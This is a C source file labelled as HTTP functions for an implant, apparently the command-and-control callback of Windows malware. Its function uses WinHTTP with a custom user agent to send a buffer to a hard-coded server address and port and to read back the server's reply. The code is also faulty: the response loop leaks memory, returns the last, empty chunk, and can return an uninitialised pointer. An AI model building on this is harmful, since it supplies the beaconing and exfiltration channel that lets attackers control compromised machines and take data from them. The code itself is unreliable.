// HTTP Functions for Implant

#include "http_client.h"

LPBYTE SendToServer(LPCWSTR VERB, LPCWSTR PATH, BYTE *buffer, size_t bytes_written) {

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		   hConnect = NULL,
		   hRequest = NULL;
	BYTE *responseBuffer;

	// Use WinHttpOpen to obtain a session handle.
        hSession = WinHttpOpen(L"A Custom User Agent",
                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME,
                        WINHTTP_NO_PROXY_BYPASS, 0);

        // Specify an HTTP server.
	if (hSession) {
		LPCWSTR SERVER_NAME = L"0.0.0.0";
		hConnect = WinHttpConnect(hSession,
				SERVER_NAME,
				5000,
				0);
	}
	
	// Create an HTTP request handle.
	if (hConnect) {
		hRequest = WinHttpOpenRequest(hConnect,
				VERB,
				PATH,
                                NULL,
				WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES,
				0);
	}

	/**
	// Set the Content-Type header
        WinHttpAddRequestHeaders(hRequest,
                        L"Content-Type: application/x-protobuf",
                        -1,
                        WINHTTP_ADDREQ_FLAG_ADD);
	**/

        if (hRequest) {
                bResults = WinHttpSendRequest(hRequest,
                                WINHTTP_NO_ADDITIONAL_HEADERS,
                                0,
                                buffer,
                                bytes_written,
                                bytes_written,
				0);
        }

	// End the request.
	if (bResults) {

        	// Receive the response
        	if (WinHttpReceiveResponse(hRequest, NULL)) {
			DEBUG_PRINTF("[+] Server's response -->\n");
			do {
                        	// Check for available data
                        	dwSize = 0;
                        	if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                	DEBUG_PRINTF("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
                        	}
				DEBUG_PRINTF("%lu\n", dwSize);
                        	// Allocate space for the data
                        	responseBuffer = (BYTE *)malloc(dwSize + 1);
				//pszOutBuffer = new char[dwSize+1];
                        	if (!responseBuffer) {
                                	DEBUG_PRINTF("Out of memory\n");
                                	dwSize = 0;
                        	} else {
                                	// Read the data
                                	ZeroMemory(responseBuffer, dwSize + 1);
                                	if (!WinHttpReadData(hRequest,
								(LPVOID)responseBuffer,
								dwSize,
                                                        	&dwDownloaded)) {
                                        	DEBUG_PRINTF("Error %lu in WinHttpReadData.\n", GetLastError());

                                	} else {
                                        	DEBUG_PRINTF("%s", responseBuffer);
                                	}
                        	}
                	} while (dwSize > 0);
		}
		// Clean up
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);

		return responseBuffer;
	}
	// Clean up
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return NULL;
}
